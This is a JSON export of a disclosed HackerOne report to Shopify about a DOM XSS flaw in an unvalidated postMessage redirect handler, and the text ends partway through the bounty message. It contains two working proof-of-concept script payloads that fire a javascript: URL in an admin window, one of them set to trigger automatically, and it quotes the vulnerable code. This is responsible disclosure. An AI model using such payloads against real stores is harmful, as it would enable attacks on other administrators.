{"id":576532,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzY1MzI=","url":"https://hackerone.com/reports/576532","title":"DOM XSS via Shopify.API.remoteRedirect","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-05-10T15:05:16.793Z","submitted_at":"2019-05-10T15:05:16.793Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yxw21","url":"/yxw21","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-06-05T23:24:37.469Z","bug_reporter_agreed_on_going_public_at":"2019-06-05T23:24:37.351Z","team_member_agreed_on_going_public_at":"2019-06-05T19:54:40.982Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hi, team, after I read the report #422043, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, \n```\n\u003cscript\u003e\n  function attack(){\n  \tvar ctx=window.open('https://cuxuri.myshopify.com/admin/themes');\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\"message\":\"Shopify.API.remoteRedirect\",\"data\":{\"location\":\"javascript:alert(document.domain)\"}}`);\n      }\n    },500);;\n  }\n\u003c/script\u003e\n\u003ca href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\"\u003eclick me start attack\u003c/a\u003e\n```\nthen log in to the store, access the page containing the payload, you can trigger xss, \nsuch as:\n\n{F487966}\n\nProblem code:\n```\nhttps://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js\ncase de.RemoteRedirect:\n                            this.handleRemoteRedirect(t.location);\n                            break;\n```\n\n## Impact\n\nAttack other administrators","vulnerability_information_html":"\u003cp\u003ehi, team, after I read the report \u003ca href=\"/reports/422043\"\u003e#422043\u003c/a\u003e, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n  function attack(){\n    var ctx=window.open(\u0026#39;https://cuxuri.myshopify.com/admin/themes\u0026#39;);\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\u0026quot;message\u0026quot;:\u0026quot;Shopify.API.remoteRedirect\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;location\u0026quot;:\u0026quot;javascript:alert(document.domain)\u0026quot;}}`);\n      }\n    },500);;\n  }\n\u0026lt;/script\u0026gt;\n\u0026lt;a href=\u0026quot;javascript:attack()\u0026quot; style=\u0026quot;display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\u0026quot;\u0026gt;click me start attack\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethen log in to the store, access the page containing the payload, you can trigger xss, \u003cbr\u003e\nsuch as:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/966/991506843fc85cc8b5491bcb19496e210106170c/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062237Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=eb0d36cb048913121807a1249ebb8edacd84ec64bfddcbb624ae79bae04aa5f4\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/966/991506843fc85cc8b5491bcb19496e210106170c/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062237Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=eb0d36cb048913121807a1249ebb8edacd84ec64bfddcbb624ae79bae04aa5f4\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eProblem code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js\ncase de.RemoteRedirect:\n                            this.handleRemoteRedirect(t.location);\n                            break;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttack other administrators\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":487966,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/966/991506843fc85cc8b5491bcb19496e210106170c/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062237Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=eb0d36cb048913121807a1249ebb8edacd84ec64bfddcbb624ae79bae04aa5f4","file_size":201924,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":14,"voters":["secator","jin0ne","mygf","tungpun","asad0x01_","decoy","tems","cryptographer","clarckowen_","aymenazer","and 4 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4810087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In the payload, if you want to trigger automatically, you can directly call the attack function without calling after the click, and this is after the payload application.\n{F487970}","markdown_message":"\u003cp\u003eIn the payload, if you want to trigger automatically, you can directly call the attack function without calling after the click, and this is after the payload application.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/970/45b3c50c4b2612a9c8e720f886faf2e2365297ee/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062237Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=dbc6775f3c7a0ca93a8744d21225e448a5b4dbf50801bbc35c060af1cec0c0c5\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/970/45b3c50c4b2612a9c8e720f886faf2e2365297ee/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062237Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=dbc6775f3c7a0ca93a8744d21225e448a5b4dbf50801bbc35c060af1cec0c0c5\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-10T15:08:55.505Z","updated_at":"2019-05-10T15:08:55.505Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":487970,"filename":"2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/970/45b3c50c4b2612a9c8e720f886faf2e2365297ee/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062237Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=dbc6775f3c7a0ca93a8744d21225e448a5b4dbf50801bbc35c060af1cec0c0c5"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4810102,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I made a mistake, verifying the origin, but not verifying the protocol to open the URL.","markdown_message":"\u003cp\u003eI made a mistake, verifying the origin, but not verifying the protocol to open the URL.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-10T15:12:46.348Z","updated_at":"2019-05-10T15:15:29.173Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4816337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"new payload:\n```\n\u003cscript\u003e\n  function attack(){\n    var ctx=window.open(location.origin+'/admin/themes','_blank');\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\"message\":\"Shopify.API.remoteRedirect\",\"data\":{\"location\":\"javascript:alert(document.domain)\"}}`);\n      }\n    },500);;\n  }\n  attack();\n\u003c/script\u003e\n\u003ca href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\"\u003eclick me start attack\u003c/a\u003e\n```\nWrite the payload to the theme, then access the page containing the theme, it should be triggered directly, you will see a popup window, if not, you need to click the click me start attack button","markdown_message":"\u003cp\u003enew payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n  function attack(){\n    var ctx=window.open(location.origin+\u0026#39;/admin/themes\u0026#39;,\u0026#39;_blank\u0026#39;);\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\u0026quot;message\u0026quot;:\u0026quot;Shopify.API.remoteRedirect\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;location\u0026quot;:\u0026quot;javascript:alert(document.domain)\u0026quot;}}`);\n      }\n    },500);;\n  }\n  attack();\n\u0026lt;/script\u0026gt;\n\u0026lt;a href=\u0026quot;javascript:attack()\u0026quot; style=\u0026quot;display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\u0026quot;\u0026gt;click me start attack\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWrite the payload to the theme, then access the page containing the theme, it should be triggered directly, you will see a popup window, if not, you need to click the click me start attack button\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-11T10:25:11.296Z","updated_at":"2019-05-11T10:25:11.296Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4828724,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @wxy7174,\n\nThank you for your report.\nWe've reproduced this issue and will update you when a fix is deployed. \n\nThanks again for your interest in improving the security of Shopify.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/wxy7174\"\u003e@wxy7174\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report.\u003cbr\u003e\nWe\u0026#39;ve reproduced this issue and will update you when a fix is deployed. \u003c/p\u003e\n\n\u003cp\u003eThanks again for your interest in improving the security of Shopify.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-13T16:13:46.296Z","updated_at":"2019-05-13T16:13:46.296Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4828982,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're awarding an initial $500, and will award the remainder (if any) once the issue is resolved.","markdown_message":"\u003cp\u003eWe\u0026#39;re awarding an initial $500, and will award the remainder (if any) once the issue is 